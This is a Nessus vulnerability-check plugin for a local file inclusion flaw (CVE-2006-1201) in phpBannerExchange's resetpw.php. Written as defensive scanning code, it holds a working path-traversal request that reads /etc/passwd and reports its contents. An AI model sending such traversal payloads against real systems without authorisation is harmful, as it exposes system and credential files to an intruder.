#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(21153);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-1201");
  script_bugtraq_id(16996);
  script_xref(name:"OSVDB", value:"23720");

  script_name(english:"phpBannerExchange Template Class Local File Inclusion");
  script_summary(english:"Tries to read a file using phpBannerExchange's template class");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a local
file include flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpBannerExchange, a banner exchange script
written in PHP. 

The version of phpBannerExchange installed on the remote host uses a
template class that fails to sanitize user-supplied input before using
it in a PHP 'include()' function.  An unauthenticated attacker can
exploit this issue to view arbitrary files and possibly to execute
arbitrary PHP code on the affected system subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/042769.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/bannerexchange", "/exchange", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/resetpw.php?",
      "email=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like phpBannerExchange and...
    'form method="POST" action="addacctconfirm.php' >< res &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    content = strstr(res, "<b>");
    if (content) content = content - "<b>";
    if (content) content = content - strstr(content, "</b>");
    if (isnull(content)) content = res;

    report = string(
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
